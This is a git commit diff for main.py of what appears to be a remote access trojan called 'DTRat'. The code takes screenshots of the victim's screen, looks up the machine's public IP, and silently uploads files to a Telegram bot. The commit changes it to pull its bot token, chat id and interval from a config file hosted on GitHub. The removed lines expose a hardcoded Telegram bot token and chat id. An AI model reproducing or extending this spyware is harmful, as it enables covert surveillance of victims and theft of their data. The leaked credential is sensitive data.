746a3667a6baa4c25b94cff73dac42a6de9181f6
paledega <38860643+paledega@users.noreply.github.com>
2022-04-04 01:02:24 +0300

    Update main.py

--- main.py
+++ main.py
@@ -3,17 +3,32 @@ import requests
 import time
 import os, sys
 import platform
+inidata = requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time())).content.decode("utf-8")
 
+# Fuck configparser All homies use for loop.
+config = {}
+sec = ""
+for line in inidata.split("\n"):
+    if len(line) == 0:
+        continue
+    if line[0] == "[":
+        sec = line[1:-1]
+        if sec not in config:
+            config[sec] = {}
+        continue
+    name = line.split("=")[0]
+    value = line.split("=")[1]
+    config[sec][name] = value
 
-token='1135091247:AAHBn533Jx27qAsZHrIdpLrEMCciDHyM9Uc'
-chatid = '-1001120619561'
-interval = 300
+token=config["main"]["token"]
+chatid =config["main"]["chatid"]
+interval = int(config["main"]["interval"])
 ip = requests.get("http://ifconfig.me").content.decode("utf-8")
-
 caption = "amogus"
 
 def get_screenshot():
-    fname = os.environ["TEMP"]+str(time.time())+".png"
+    fname = os.environ["TEMP"]+"/"+str(time.time())+".png".replace("\\","/")
+    print(fname)
     im2 = pyautogui.screenshot(fname)
     return fname
 
@@ -27,7 +42,7 @@ def send_image(fname):
 def send_file(fname):
     url='https://api.telegram.org/bot{}/sendDocument'.format(token)
     files={'document': open(fname,'rb')}
-    values={'chat_id' : chatid , 'caption':caption,"disable_notification": true}
+    values={'chat_id' : chatid , 'caption':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
     r=requests.post(url,files=files,data=values)
     print(r.content)
 
